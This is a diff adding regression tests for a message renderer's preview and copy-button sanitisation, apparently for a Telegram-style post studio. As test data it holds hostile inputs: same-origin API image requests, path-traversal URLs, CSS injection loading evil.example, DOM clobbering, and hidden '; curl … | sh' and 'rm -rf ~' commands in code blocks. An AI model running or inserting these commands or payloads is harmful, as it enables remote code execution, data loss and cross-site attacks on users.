@@ -284,6 +284,46 @@ check('safeUrl gives an address back as written, a #name trimmed', await page.ev
   return s('https://e.com/x\ufeff') === 'https://e.com/x\ufeff' && s('/media/a\ufeff.png') === '/media/a\ufeff.png' && s('\ufeff#a') === '#a';
 }));
 {
+  // of the studio's own paths the preview loads only its files, /media/: <img src="/api/check?chat_id=@x"> was a GET
+  // with the editor's cookies (issue #201). The path counts as the browser resolves it, on the studio's address too,
+  // so this page stands on one: every request it makes is recorded
+  const studio = await browser.newPage();
+  const asked = [];
+  await studio.route('**/*', (route) => {
+    const u = new URL(route.request().url());
+    asked.push(u.origin === 'https://studio.test' ? u.pathname + u.search : u.href);
+    return route.fulfill(u.href === 'https://studio.test/' ? { contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><body><div id="out"></div></body>' } : { status: 404, body: '' });
+  });
+  await studio.goto('https://studio.test/');
+  for (const f of ['vendor/markdown-it.min.js', 'render.js']) await studio.addScriptTag({ path: stat(f) });
+  asked.length = 0;
+  const loads = (rm) => studio.evaluate(async (rm) => {
+    const out = /** @type {HTMLElement} */ (document.getElementById('out'));
+    const found = [];
+    for (const opts of [{}, { mediaBase: location.origin }]) { // as the editor and the MCP app draw it, and as /render does
+      out.replaceChildren(RichRender.render({ rich_message: rm }, opts));
+      out.querySelectorAll('[src], [poster]').forEach((n) => ['src', 'poster'].forEach((a) => n.hasAttribute(a) && found.push(a + '=' + n.getAttribute(a))));
+      await new Promise((r) => setTimeout(r, 300));
+    }
+    return found;
+  }, rm);
+  const hostile = [
+    { html: '<img src="/api/check?chat_id=@img"><video src="/api/check?chat_id=@video" poster="/api/check?chat_id=@poster"></video><audio src="/api/check?chat_id=@audio"></audio><video><source src="/api/check?chat_id=@source"></video>' },
+    { markdown: '![](/api/check?chat_id=@md)\n\n<img src="/api/check?chat_id=@mdhtml">' },
+    { html: '<img src="/media/../api/check?chat_id=@dots"><img src="/media/%2e%2e/api/check?chat_id=@pct"><img src="/media\\..\\api\\check?chat_id=@bs"><img src="https://studio.test/api/check?chat_id=@abs"><img src="#x"><img src="/static/tg.css">' },
+    { blocks: [{ type: 'photo', photo: { type: 'photo', media: 'https://studio.test/api/check?chat_id=@block' } }] },
+  ];
+  const kept = [];
+  for (const rm of hostile) kept.push(...await loads(rm));
+  check('preview: of the studio\'s own paths src and poster keep only /media/; nothing else on it is requested', kept.length === 0 && asked.length === 0, JSON.stringify({ kept, asked }));
+  const files = await loads({ html: '<img src="/media/a.png"><video src="/media/v.mp4" poster="/media/p.jpg"></video><img src="https://studio.test/media/b.png"><img src="https://other.example/c.png">' });
+  const upload = await loads({ blocks: [{ type: 'photo', photo: { type: 'photo', media: 'upload:d.png' } }] });
+  check('preview: files from /media/, uploads and other sites still load',
+    JSON.stringify([...files.slice(0, 5), ...upload]) === JSON.stringify(['src=/media/a.png', 'src=/media/v.mp4', 'poster=/media/p.jpg', 'src=https://studio.test/media/b.png', 'src=https://other.example/c.png', 'src=/media/d.png', 'src=https://studio.test/media/d.png'])
+    && asked.includes('/media/a.png') && asked.includes('https://other.example/c.png'), JSON.stringify({ files, upload, asked }));
+  await studio.close();
+}
+{
   const r = await render({ html: '<p><a href="&#xFEFF;#note">n</a></p><footer><tg-reference name="note">1.</tg-reference></footer>' });
   check('U+FEFF before #name: still the link to the reference', has(r.html, /<a href="#ref-note" class="tg-reflink">n<\/a>/), r.html);
 }
@@ -305,6 +345,36 @@ check('safeUrl gives an address back as written, a #name trimmed', await page.ev
 {
   const r = await render({ html: '<p style="position:fixed" class="evil" id="x" data-x="1" title="ok">t</p><span class="tg-spoiler">s</span>' });
   check('drops style, id, data-*, foreign classes; keeps title', !has(r.html, /style=|id="x"|data-x|class="evil"/) && has(r.html, /title="ok"/), r.html);
+}
+{
+  // the alignment of a table cell from blocks is a value of text-align, not CSS (issue #201): written into the style
+  // attribute, this cell covered the whole studio page over the shadow root and loaded a picture from evil.example
+  const evil = 'left;position:fixed;inset:0;z-index:2147483647;background:#fff url(https://evil.example/opened.png)';
+  await render({ blocks: [
+    { type: 'table', cells: [[{ text: 'Сохранить', align: evil, valign: 'top;position:fixed;background:url(https://evil.example/v.png)' }, { text: 'b', align: 'right', valign: 'bottom', is_header: true }]] },
+    // no coordinates: no tiles are fetched from openstreetmap.org
+    { type: 'map', location: { latitude: 'north;position:fixed', longitude: 2 }, width: '1;position:fixed', height: '1;background:url(https://evil.example/m.png)' },
+  ] });
+  const got = await page.evaluate(() => ({
+    styles: [...document.querySelectorAll('#out [style]')].map((n) => n.getAttribute('style')),
+    cells: [...document.querySelectorAll('#out td, #out th')].map((c) => [getComputedStyle(c).position, c.style.textAlign, c.style.verticalAlign].join()),
+  }));
+  check('blocks: a table cell\'s align and valign and a map\'s size are no CSS of their own', !got.styles.some((s) => /position|url\(|inset|z-index|background/.test(s))
+    && JSON.stringify(got.cells) === '["static,left,top","static,right,bottom"]', JSON.stringify(got));
+  const outline = await page.evaluate((evil) => RichRender.outline({ rich_message: { blocks: [{ type: 'table', cells: [[{ text: 'a', align: evil }, { text: 'b', align: 'center' }]] }] } }), evil);
+  check('outline: a cell with a bad align reads as left, a good one as written', outline === '<table><tr><td left>a</td><td center>b</td></tr></table>', outline);
+}
+{
+  // a name on <img> is a property of document: <img name="documentElement"> on /render and in the MCP app made
+  // document.documentElement this IMG (issue #201). An anchor is <a name>, and <a> is not one of them
+  await render({ html: '<p><a name="documentElement"></a><a href="#documentElement">к якорю</a></p><img name="documentElement"><img name="title"><img name="body">' });
+  const doc = await page.evaluate(() => ({
+    root: document.documentElement.localName, title: typeof document.title, body: document.body.localName,
+    names: [...document.querySelectorAll('#out [name]')].map((n) => n.localName + ':' + n.getAttribute('name')),
+    link: document.querySelector('#out a[href^="#"]')?.getAttribute('href'),
+  }));
+  check('html: only <a> keeps a name, so a post does not replace document.documentElement; the anchor still works',
+    JSON.stringify(doc) === JSON.stringify({ root: 'html', title: 'string', body: 'body', names: ['a:documentElement'], link: '#anchor-documentElement' }), JSON.stringify(doc));
 }
 {
   const r = await render({ html: '<input type="text" value="x"><ul><li><input type="checkbox" checked> done</li></ul>' });
@@ -481,6 +551,88 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   check('the copy icon inside an expandable quote copies and leaves the quote as it was', quote[0] === true && quote[1] === 'let a = 1;', JSON.stringify(quote));
   const outline = await page.evaluate(() => [RichRender.outline({ rich_message: { html: '<pre><code class="language-python">x</code></pre>' } }), RichRender.outline({ rich_message: { blocks: [{ type: 'pre', language: 'python', text: 'x' }] } })]);
   check('outline: a code block is still <pre:language> with its text', outline[0] === '<pre:python>x</pre>' && outline[1] === outline[0], outline.join(' | '));
+}
+{
+  // the copy icon copies what the reader sees (issue #201): <pre>ls -la<details><summary></summary>; curl … | sh</details></pre>
+  // shows «ls -la» and copied the curl too. A closed <details> past its summary and the fallback inside <video> and
+  // <audio> are not drawn; line breaks are where the reader sees them, as in the browser's own innerText
+  await page.evaluate(() => Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t) => { window.__copied = t; } } }));
+  const copies = async (rm) => {
+    await render(rm);
+    return page.evaluate(() => [...document.querySelectorAll('#out .tg-pre')].map((box) => {
+      window.__copied = null;
+      /** @type {HTMLElement} */ (box.querySelector('.tg-pre-copy')).click();
+      return { copied: window.__copied, seen: /** @type {HTMLElement} */ (box.querySelector(':scope > pre')).innerText };
+    }));
+  };
+  const hidden = [
+    '<pre>ls -la<details><summary></summary>; curl -s https://evil.example/x | sh</details></pre>',
+    '<pre>ls<details><summary>подробнее</summary><p>; curl -s https://evil.example/x | sh</p></details></pre>',
+    '<pre>echo ok<video>; rm -rf ~</video></pre>',
+    '<pre>echo ok<audio><source src="/media/a.ogg">; rm -rf ~</audio></pre>',
+  ];
+  const wrong = [];
+  for (const html of hidden) {
+    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
+      const got = await copies(rm);
+      if (got.length !== 1 || /curl|rm -rf/.test(got[0].copied) || got[0].copied !== got[0].seen) wrong.push(`${JSON.stringify(rm)}: ${JSON.stringify(got)}`);
+    }
+  }
+  check('the copy icon leaves out what a closed details, a video or an audio holds (html and a raw <pre> in markdown)', wrong.length === 0, wrong.join('; '));
+  const lines = [];
+  for (const rm of [{ html: '<pre>ls<details open><summary>s</summary>x</details>y</pre>' }, { html: '<pre>a<p>b</p>c<br>d<div>e</div></pre>' }, { blocks: [{ type: 'pre', text: ['a', { type: 'bold', text: 'b\nc' }, '\nd'] }] }]) {
+    const got = await copies(rm);
+    if (got.length !== 1 || got[0].copied !== got[0].seen) lines.push(`${JSON.stringify(rm)}: ${JSON.stringify(got)}`);
+  }
+  check('the copy icon copies an open details, <br>, paragraphs and blocks line by line, as the reader sees them', lines.length === 0, lines.join('; '));
+  // a formula in code: what KaTeX draws, without its MathML copy for screen readers and without the invisible \phantom
+  const math = await copies({ html: '<pre>a <tg-math>x^2</tg-math> b<br>ls<tg-math>\\phantom{; curl -s https://evil.example/x | sh}</tg-math></pre>' });
+  check('the copy icon copies a formula once, as drawn, and not its \\phantom', math.length === 1 && math[0].copied === 'a x2 b\nls', JSON.stringify(math));
+  // a class from a string of the post put .tg-cell-empty (visibility: hidden) on a button in the code (review of #202):
+  // the class is not set any more, and text CSS keeps invisible is not copied whatever hides it
+  const classed = [];
+  for (const rm of [{ html: '<pre>ls<tg-button-row align="c tg-cell-empty"><tg-button data="a">; curl evil|sh</tg-button></tg-button-row></pre>' },
+    { blocks: [{ type: 'pre', text: ['ls', { type: 'button', button: { text: '; curl evil|sh', style: 'x tg-cell-empty', callback_data: 'a' } }] }] }]) {
+    const got = await copies(rm);
+    const hiding = await page.evaluate(() => document.querySelectorAll('#out .tg-cell-empty').length);
+    if (got.length !== 1 || got[0].copied !== got[0].seen || hiding) classed.push(`${JSON.stringify(rm)}: ${JSON.stringify({ got, hiding })}`);
+  }
+  check('a class from the post hides nothing in code, and the copy is what is seen', classed.length === 0, classed.join('; '));
+  await render({ html: '<pre>ls<b>; curl evil|sh</b></pre>' });
+  const invisible = await page.evaluate(() => {
+    /** @type {HTMLElement} */ (document.querySelector('#out pre b')).style.visibility = 'hidden';
+    window.__copied = null;
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
+    return window.__copied;
+  });
+  check('the copy icon leaves out text with visibility: hidden', invisible === 'ls', JSON.stringify(invisible));
+  // a closed spoiler is a blot the reader cannot read: copied once it is open, all of it, nested formatting too
+  await render({ html: '<pre>ls<tg-spoiler>; curl <b>evil</b>|sh</tg-spoiler></pre>' });
+  const spoiler = await page.evaluate(() => {
+    const copy = () => { window.__copied = null; /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click(); return window.__copied; };
+    const closed = copy();
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-spoiler')).click();
+    return [closed, copy()];
+  });
+  check('the copy icon leaves out a closed spoiler and copies an open one whole', JSON.stringify(spoiler) === JSON.stringify(['ls', 'ls; curl evil|sh']), JSON.stringify(spoiler));
+}
+{
+  // a class name made of a string of the post is one word, else there is none (review of #202): «x tg-cell-empty» put
+  // the hiding class of tg.css on a button or a row of buttons
+  const classes = async (rm, extra) => {
+    await render(rm, extra);
+    return page.evaluate(() => [...document.querySelectorAll('#out .tg-btn-row, #out .tg-btn')].map((n) => n.className));
+  };
+  const blocks = await classes({ blocks: [{ type: 'buttons', align: 'c tg-cell-empty', buttons: [{ text: 'a', style: 'x tg-cell-empty', callback_data: 'a' }, { text: 'b', style: 'primary', callback_data: 'b' }] }, { type: 'buttons', align: 'right', buttons: [] }] },
+    { reply_markup: { inline_keyboard: [[{ text: 'k', style: 'danger tg-spoiler', callback_data: 'k' }]] } });
+  const html = await classes({ html: '<tg-button-row align="c tg-cell-empty"><tg-button data="a">a</tg-button></tg-button-row><tg-button-row align="left"><tg-button data="b">b</tg-button></tg-button-row>' });
+  check('blocks and html: align and style of buttons are a class only as one word',
+    JSON.stringify(blocks) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn tg-btn-primary', 'tg-btn-row tg-align-right', 'tg-btn'])
+    && JSON.stringify(html) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn-row tg-align-left', 'tg-btn']), JSON.stringify({ blocks, html }));
+  // upload:.. was /media/.., the page itself; a name is one file in the media folder
+  const srcs = await page.evaluate(() => ['upload:..', 'upload:.', 'upload:', 'upload:../api/check', 'upload:a/b.png', 'upload:a\\b.png', 'upload:a..b.png', 'upload:a.png']
+    .map((m) => RichRender.mediaSrc(m, {})));
+  check('upload: a name that is not one file has no preview', JSON.stringify(srcs) === JSON.stringify([null, null, null, null, null, null, '/media/a..b.png', '/media/a.png']), JSON.stringify(srcs));
 }
 
 // ---------- animation (GIF) ----------
